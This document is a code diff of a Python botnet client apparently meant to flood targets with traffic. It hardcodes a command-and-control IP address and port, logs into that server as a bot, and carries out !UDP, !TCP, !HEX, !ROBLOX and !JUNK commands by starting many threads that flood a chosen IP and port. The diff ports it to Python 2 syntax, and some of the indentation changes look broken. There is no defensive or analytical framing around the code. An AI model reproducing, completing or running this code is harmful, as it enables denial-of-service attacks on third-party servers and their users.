@@ -2,7 +2,6 @@ import socket
 import threading
 import time
 import random
-import requests
 import ctypes
 
 C2_ADDRESS = "147.185.221.24"
@@ -66,66 +65,66 @@ def attack_junk(ip, port, secs):
         s.sendto(payload, (ip, port))
 
 def handle_c2_connection(c2):
-    c2.send('669787761736865726500'.encode())
+    c2.send('669787761736865726500')
     while True:
         time.sleep(1)
-        data = c2.recv(1024).decode()
+        data = c2.recv(1024)
         if 'Username' in data:
-            c2.send('BOT'.encode())
+            c2.send('BOT')
             break
     while True:
         time.sleep(1)
-        data = c2.recv(1024).decode()
+        data = c2.recv(1024)
         if 'Password' in data:
-            c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
+            c2.send('\xff\xff\xff\xff\75')
             break
     while True:
         try:
-            data = c2.recv(1024).decode().strip()
+            data = c2.recv(1024).strip()
             if not data:
                 break
             args = data.split(' ')
             command = args[0].upper()
-            print(f"Received request: {data}")
+            print "Received request: " + data
             if command == '!UDP':
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])
                 for _ in range(threads):
-                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
+                    threading.Thread(target=attack_udp, args=(ip, port, secs)).start()
             elif command == '!TCP':
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])
                 for _ in range(threads):
-                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
+                    threading.Thread(target=attack_tcp, args=(ip, port, secs)).start()
             elif command == '!HEX':
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])
                 for _ in range(threads):
-                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
+                    threading.Thread(target=attack_hex, args=(ip, port, secs)).start()
             elif command == '!ROBLOX':
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])
                 for _ in range(threads):
-                    threading.Thread(target=attack_roblox, args=(ip, port, secs), daemon=True).start()
+                    threading.Thread(target=attack_roblox, args=(ip, port, secs)).start()
             elif command == '!JUNK':
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])
                 for _ in range(threads):
-                    threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
-                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
-                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
+                    threading.Thread(target=attack_junk, args=(ip, port, secs)).start()
+                threading.Thread(target=attack_udp, args=(ip, port, secs)).start()
+                threading.Thread(target=attack_tcp, args=(ip, port, secs)).start()
             elif command == '!PING':
-                c2.send('PONG'.encode())
+                c2.send('PONG')
         except:
             break
     c2.close()
@@ -136,15 +135,15 @@ def reconnect_thread():
             c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             c2.connect((C2_ADDRESS, C2_PORT))
-            threading.Thread(target=handle_c2_connection, args=(c2,), daemon=True).start()
+            threading.Thread(target=handle_c2_connection, args=(c2,)).start()
         except:
             if 'c2' in locals():
                 c2.close()
-        time.sleep(1)
+            time.sleep(1)
 
 def main():
     while True:
-        threading.Thread(target=reconnect_thread, daemon=True).start()
+        threading.Thread(target=reconnect_thread).start()
         while True:
             time.sleep(30)
 
